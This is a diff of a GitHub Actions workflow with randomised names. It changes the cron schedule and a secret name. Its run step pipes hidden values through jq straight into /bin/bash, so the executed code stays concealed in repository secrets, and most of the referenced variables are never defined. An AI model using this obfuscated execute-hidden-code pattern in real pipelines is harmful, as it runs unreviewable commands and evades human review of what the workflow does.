@@ -2,8 +2,7 @@ name: chunjiehcj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
-
+    - cron: '59 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: chunjiehcj
         env:
-          cbfbq776: ${{ secrets.cbfbq776 }}
+          gwizf91: ${{ secrets.gwizf91 }}
         run: |
-          echo $cbfbq776 | jq -r .yqfwb94963 | /bin/bash
-          echo $nuun9 | jq -r .hg4 | /bin/bash
-          echo $bde59 | jq -r .slg77503 | /bin/bash
-          echo $hrnwr13 | jq -r .t2500 | /bin/bash
-          echo $wtyq96074 | jq -r .pyd8771 | /bin/bash
-          echo $wqnvs25546 | jq -r .uba59437 | /bin/bash
-          echo $jhpq14879 | jq -r .s28128 | /bin/bash
-          echo $aecgp36 | jq -r .k12 | /bin/bash
-          echo $mjn69277 | jq -r .yq5 | /bin/bash
-          echo $opkie91 | jq -r .flmjo000 | /bin/bash
+          echo $gwizf91 | jq -r .ngi89 | /bin/bash
+          echo $bcua78228 | jq -r .ysxa96792 | /bin/bash
+          echo $vo653 | jq -r .gchmn25079 | /bin/bash
+          echo $hxio4663 | jq -r .celwh81 | /bin/bash
+          echo $pyblw73 | jq -r .lmdm83 | /bin/bash
+          echo $tjupc1354 | jq -r .wwbtw73 | /bin/bash
+          echo $zlpx77 | jq -r .bjq31848 | /bin/bash
 
